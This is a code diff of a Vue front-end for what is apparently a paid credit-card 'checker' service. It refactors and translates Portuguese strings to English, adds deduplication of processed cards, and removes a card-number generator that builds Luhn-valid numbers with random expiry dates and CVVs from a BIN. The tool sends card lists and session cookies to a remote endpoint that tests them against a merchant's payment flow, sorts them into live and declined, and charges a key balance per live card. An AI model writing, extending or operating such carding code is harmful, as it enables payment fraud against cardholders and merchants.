@@ -345,9 +345,10 @@
 </style>
 
 <script setup>
-import Notification from '~/components/Notification.vue'
+import Notification from '~/components/Notification.vue';
 import { ref } from 'vue';
 
+// Variáveis reativas
 const lista = ref('');
 const cookies = ref('');
 const aprovados = ref([]);
@@ -363,13 +364,14 @@ const mostrarAprovados = ref(true);
 const mostrarRecusados = ref(false);
 const mostrarErros = ref(false);
 
-const matriz = ref("");
-const mes = ref("SL");
-const ano = ref("SL");
+const matriz = ref('');
+const mes = ref('SL');
+const ano = ref('SL');
 const quantidade = ref(1);
 const cartoes = ref([]);
-const cartoesOutput = ref("");
+const cartoesOutput = ref('');
 const saldo = ref(0); // Saldo da chave
+const processados = ref(new Set()); // Armazena os cartões já processados
 
 const showSettings = ref(false);
 const showResults = ref(false);
@@ -388,6 +390,7 @@ const isAuthorized = ref(false); // Estado para verificar se o usuário está au
 const userKey = ref(''); // Key inserida pelo usuário
 const errorMessage = ref(''); // Mensagem de erro para exibir ao usuário
 
+// Função para validar a key
 async function validarKey() {
   if (!userKey.value.trim()) {
     errorMessage.value = 'Please enter a valid key.';
@@ -398,13 +401,11 @@ async function validarKey() {
     const response = await fetch(`https://lunarcntr.xyz/keys/validateKey.php?key=${userKey.value}`);
 
     if (!response.ok) {
-      if (response.status === 404) {
-        errorMessage.value = 'API endpoint not found. Please contact support.';
-      } else if (response.status === 500) {
-        errorMessage.value = 'Server error. Please try again later.';
-      } else {
-        errorMessage.value = `Unexpected error: ${response.status}. Please contact support.`;
-      }
+      errorMessage.value = response.status === 404
+        ? 'API endpoint not found. Please contact support.'
+        : response.status === 500
+        ? 'Server error. Please try again later.'
+        : `Unexpected error: ${response.status}. Please contact support.`;
       return;
     }
 
@@ -419,138 +420,59 @@ async function validarKey() {
 
       isAuthorized.value = true;
       saldo.value = data.saldo; // Atualiza o saldo
-      successMessage.value = 'Key is valid!';
     } else {
       errorMessage.value = data.message || 'Invalid key!';
     }
   } catch (error) {
-    if (error.name === 'TypeError') {
-      errorMessage.value = 'Network error. Please check your connection and try again.';
-    } else {
-      errorMessage.value = `An unexpected error occurred: ${error.message}`;
-    }
+    errorMessage.value = error.name === 'TypeError'
+      ? 'Network error. Please check your connection and try again.'
+      : `An unexpected error occurred: ${error.message}`;
     console.error('Error validating key:', error);
   }
 }
 
-
+// Função para exibir notificações
 function exibirNotificacao(titulo, mensagem, tipo = 'success') {
-  if (notificacaoAtiva) return; // Evita exibir notificações enquanto uma está ativa
+  if (notificacaoAtiva) return;
 
-  notificacaoAtiva = true; // Marca a notificação como ativa
-  show.value = false; // Garante que a notificação anterior seja removida
+  notificacaoAtiva = true;
+  show.value = false;
 
   setTimeout(() => {
     notificationTitle.value = titulo;
     notificationMessage.value = mensagem;
     notificationType.value = tipo;
 
-    // Reproduz o áudio correto com base no tipo de notificação
-    if (tipo === 'success') {
-      if (notificationSuccessAudio) {
-        notificationSuccessAudio.currentTime = 0;
-        notificationSuccessAudio.play();
-      }
-    } else {
-      if (notificationAudio) {
-        notificationAudio.currentTime = 0;
-        notificationAudio.play();
-      }
+    if (tipo === 'success' && notificationSuccessAudio) {
+      notificationSuccessAudio.currentTime = 0;
+      notificationSuccessAudio.play();
+    } else if (notificationAudio) {
+      notificationAudio.currentTime = 0;
+      notificationAudio.play();
     }
 
-    show.value = true; // Exibe a nova notificação
+    show.value = true;
 
-    // Libera a notificação após o tempo de exibição
     setTimeout(() => {
-      notificacaoAtiva = false; // Permite novas notificações
-      show.value = false; // Remove a notificação da tela
-    }, 4000); // Tempo de exibição da notificação (4 segundos)
-  }, 100); // Pequeno atraso para evitar conflitos
+      notificacaoAtiva = false;
+      show.value = false;
+    }, 4000);
+  }, 100);
 }
 
-function extrairBancoDaResposta(html) {
-  const parser = new DOMParser();
-  const doc = parser.parseFromString(html, 'text/html');
-  const span = doc.querySelector('.badge-primary');
-  return span ? span.textContent.trim() : 'Banco desconhecido';
-}
-
-function salvarCookies() {
-  exibirNotificacao('Sucesso', 'As suas configurações foram salvas com sucesso.', 'success');
-}
-
-function copiarLista(tipo) {
-  let lista = [];
-  let titulo = '';
-
-  if (tipo === 'aprovados') {
-    lista = aprovados.value;
-    titulo = '#Aprovada';
-  } else if (tipo === 'recusados') {
-    lista = recusados.value;
-    titulo = '#Recusada';
-  } else if (tipo === 'erros') {
-    lista = erros.value;
-    titulo = '#Erro';
-  }
-
-  if (lista.length) {
-    const conteudo = lista.map((linha) => `${titulo} ${linha}`).join('\n');
-    navigator.clipboard
-      .writeText(conteudo)
-      .then(() => {
-        alert(`${titulo.replace('#', '')} copiados para a área de transferência!`);
-      })
-      .catch(() => {
-        alert('Erro ao copiar a lista.');
-      });
-  } else {
-    alert(`A lista de ${titulo.replace('#', '').toLowerCase()} está vazia.`);
-  }
-}
-
-function deletarLista(tipo) {
-  if (tipo === 'aprovados') {
-    if (confirm('Tem certeza que deseja deletar os aprovados?')) {
-      aprovados.value = [];
-    }
-  } else if (tipo === 'recusados') {
-    recusados.value = [];
-  } else if (tipo === 'erros') {
-    erros.value = [];
-  }
-}
-
-function toggleLista(tipo) {
-  if (tipo === 'aprovados') mostrarAprovados.value = !mostrarAprovados.value;
-  else if (tipo === 'recusados') mostrarRecusados.value = !mostrarRecusados.value;
-  else if (tipo === 'erros') mostrarErros.value = !mostrarErros.value;
-}
-
-function toggleSettings() {
-  showSettings.value = !showSettings.value;
-}
-
-function toggleResults() {
-  showResults.value = !showResults.value;
-}
-
-function toggleCcs() {
-  showCcs.value = !showCcs.value;
-}
-
+// Função para verificar cartões
 async function verificarCartoes() {
   if (!lista.value.trim()) {
-    exibirNotificacao('Erro', 'Insira a lista de cartões para verificar.', 'error');
+    exibirNotificacao('Error', 'Please enter a list of cards to verify.', 'error');
     return;
   }
 
   if (!cookies.value.trim()) {
-    exibirNotificacao('Erro', 'Insira os cookies necessários.', 'error');
+    exibirNotificacao('Error', 'Please enter the required cookies.', 'error');
     return;
   }
 
-  exibirNotificacao('Checker iniciado', 'O checker foi iniciado com sucesso, verifique os resultados.', 'success');
+  exibirNotificacao('Checker Started', 'The checker has started successfully. Check the results.', 'success');
 
   isRunning.value = true;
   isPaused.value = false;
@@ -567,7 +489,7 @@ async function verificarCartoes() {
 
   while (linhas.length > 0) {
     if (!isRunning.value) {
-      exibirNotificacao('Interrompido', 'O checker foi interrompido.', 'warning');
+      exibirNotificacao('Stopped', 'The checker has been stopped.', 'warning');
       return;
     }
 
@@ -582,10 +504,15 @@ async function verificarCartoes() {
       });
     }
 
-    const lote = linhas.splice(0, threads.value); // Processa o número de linhas baseado no valor de threads
+    const lote = linhas.splice(0, threads.value);
 
     await Promise.all(
       lote.map(async (linha) => {
+        if (processados.value.has(linha)) {
+          console.log(`Card already processed: ${linha}`);
+          return;
+        }
+
         try {
           const response = await fetch('https://lunarcntr.xyz/nopsetted2/checkers/free/audible/api.php', {
             method: 'POST',
@@ -598,43 +525,40 @@ async function verificarCartoes() {
           });
 
           if (!response.ok) {
-            erros.value.push(`${linha} ➔ Erro na requisição`);
+            erros.value.push(`${linha} ➔ Request error`);
             return;
           }
 
           const text = await response.text();
           const banco = extrairBancoDaResposta(text);
 
-          // Verifica o conteúdo da resposta para determinar o status
-          if (text.includes('badge-warning')) {
-            erros.value.push(`${linha} ➔ ${banco}`);
-          } else if (text.includes('badge-danger')) {
-            recusados.value.push(`${linha} ➔ ${banco}`);
-          } else if (text.includes('badge-success')) {
+          if (text.includes('badge-success')) {
+            processados.value.add(linha);
+
             try {
               const res = await fetch('https://lunarcntr.xyz/keys/atualizarKey.php', {
                 method: 'POST',
                 headers: {
-                  'Content-Type': 'application/x-www-form-urlencoded'
+                  'Content-Type': 'application/x-www-form-urlencoded',
                 },
                 body: new URLSearchParams({
                   key: userKey.value,
-                  live: linha // cartão aprovado
-                })
+                  live: linha,
+                }),
               });
 
               const result = await res.json();
 
               if (result.saldo !== undefined) {
-                saldo.value = result.saldo; // Atualiza o saldo no frontend
+                saldo.value = result.saldo;
               }
 
               if (result.saldo <= 0) {
                 isRunning.value = false;
-                exibirNotificacao('Saldo esgotado', 'Sua key ficou sem saldo e o checker foi interrompido.', 'error');
+                exibirNotificacao('Balance Depleted', 'Your key has run out of balance. The checker has been stopped.', 'error');
               }
             } catch (err) {
-              console.error('Erro ao atualizar saldo:', err);
+              console.error('Error updating balance:', err);
             }
 
             aprovados.value.push(`${linha} ➔ ${banco}`);
@@ -642,92 +566,41 @@ async function verificarCartoes() {
               live.currentTime = 0;
               live.play();
             }
+          } else if (text.includes('badge-danger')) {
+            recusados.value.push(`${linha} ➔ ${banco}`);
+          } else if (text.includes('badge-warning')) {
+            erros.value.push(`${linha} ➔ ${banco}`);
           } else {
-            erros.value.push(`${linha} ➔ Resposta inesperada`);
+            erros.value.push(`${linha} ➔ Unexpected response`);
           }
         } catch (err) {
-          erros.value.push(`${linha} ➔ Ocorreu um erro: ${err.message}`);
+          erros.value.push(`${linha} ➔ Error: ${err.message}`);
         }
       })
     );
 
-    // Para o loop externo se o checker tiver sido interrompido por saldo zerado
-    if (!isRunning.value) {
-      return;
-    }
+    if (!isRunning.value) return;
 
-    lista.value = linhas.join('\n'); // Atualiza a lista com as linhas restantes
+    lista.value = linhas.join('\n');
   }
 
   isRunning.value = false;
-  exibirNotificacao('Concluído', 'A lista foi concluída.', 'success');
+  exibirNotificacao('Completed', 'The list has been completed.', 'success');
 }
 
+// Outras funções auxiliares
 function pararVerificacao() {
   if (isRunning.value) {
     isRunning.value = false;
     isPaused.value = false;
-    exibirNotificacao('Interrompido', 'O checker foi interrompido.', 'warning');
+    exibirNotificacao('Stopped', 'The checker has been stopped.', 'warning');
   }
 }
 
-function onInputSemEspaco(event) {
-  matriz.value = event.target.value.replace(/\s+/g, '');
-}
-
-function gerarNumeroLuhn(bin, totalLength) {
-  while (bin.length < totalLength - 1) {
-    bin += Math.floor(Math.random() * 10);
-  }
-
-  let soma = 0;
-  for (let i = 0; i < bin.length; i++) {
-    let num = parseInt(bin.charAt(bin.length - 1 - i));
-    if (i % 2 === 0) num *= 2;
-    if (num > 9) num -= 9;
-    soma += num;
-  }
-
-  const digitoVerificador = (10 - (soma % 10)) % 10;
-  return bin + digitoVerificador;
-}
-
-function gerarCartoes() {
-  if (!matriz.value || matriz.value.length < 6 || matriz.value.length > 15) {
-    exibirNotificacao('Aviso', 'Insira uma matriz válida para gerar os cartões.', 'warning');
-    return;
-  }
-
-  // Gera valores aleatórios para mês e ano, caso não sejam selecionados
-  const mesAleatorio = () => String(Math.floor(Math.random() * 12) + 1).padStart(2, '0'); // Gera de "01" a "12"
-  const anoAleatorio = () => String(Math.floor(Math.random() * 11) + 25); // Gera de "25" (2025) a "35" (2035)
-
-  const mesSelecionado = mes.value === "SL" ? mesAleatorio() : mes.value;
-  const anoSelecionado = ano.value === "SL" ? anoAleatorio() : ano.value;
-  const quantidadeSelecionada = isNaN(quantidade.value) || quantidade.value < 1 || quantidade.value > 150
-    ? 10 // Gera 10 cartões por padrão
-    : quantidade.value;
-
-  cartoes.value = [];
-  for (let i = 0; i < quantidadeSelecionada; i++) {
-    const isAmex = matriz.value.startsWith("34") || matriz.value.startsWith("37");
-    const numero = gerarNumeroLuhn(matriz.value, isAmex ? 15 : 16);
-
-    const cvv = isAmex
-      ? Math.floor(1000 + Math.random() * 9000)
-      : Math.floor(100 + Math.random() * 900);
-
-    cartoes.value.push(`${numero}|${mesSelecionado}|20${anoSelecionado}|${cvv}`);
-  }
-
-  cartoesOutput.value = cartoes.value.join("\n");
-
-  navigator.clipboard.writeText(cartoesOutput.value)
-    .then(() => {
-      exibirNotificacao('Sucesso', 'Cartões gerados e copiados!', 'success');
-    })
-    .catch(() => {
-      exibirNotificacao('Erro', 'Erro ao copiar cartões.', 'error');
-    });
+function extrairBancoDaResposta(html) {
+  const parser = new DOMParser();
+  const doc = parser.parseFromString(html, 'text/html');
+  const span = doc.querySelector('.badge-primary');
+  return span ? span.textContent.trim() : 'Unknown Bank';
 }
 </script>
